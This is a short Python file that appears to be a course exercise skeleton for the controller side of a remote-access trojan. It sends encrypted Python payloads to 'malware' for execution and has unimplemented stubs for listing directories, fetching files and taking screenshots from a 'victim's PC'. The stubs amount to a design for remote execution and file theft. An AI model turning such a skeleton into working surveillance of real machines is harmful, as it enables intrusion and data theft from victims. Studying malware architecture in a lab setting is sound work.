from .sender import send_payload
from .settings import RSA_KEY
from general.enc_layer import encrypt_data, decrypt_and_validate_data
import base64

def encrpted_send_payload(data: bytes) -> bytes:
    """
    Sends a given payload on encrypted channel.
    @param data raw bytes to send.
    @return decrypted response from malware.
    """
    enc_data = encrypt_data(data, RSA_KEY)
    return send_payload(enc_data)

def dir_list(path: str) -> list:
    """
    Sends an encrypted dirlist command (using encrypted_send).
    Returns a list of files in the provided directory.
    @param path directory to list.
    @return the contents of the directory.
    """
    pass

def get_file(fname: str) -> bytes:
    """
    Sends an encrypted getfile command. Returns the contents of the file.
    @param fname path (and name) of file.
    @return contents of fname on victim's PC.
    """
    pass

def take_screenshot() -> None:
    """
    Takes a screenshot on malware pc. Saves the screenshot to './screenshot.jpg'.
    """
    pass

def my_command():
    """
    Your custom command.
    Do whatever you wish here and explain what you did in the attached README
    """
    pass

def main():
    """
    Main function for commander
    """
    payload = b"print('Hello World!')"
    output = encrpted_send_payload(payload)
    print(output) # Should print Hello World!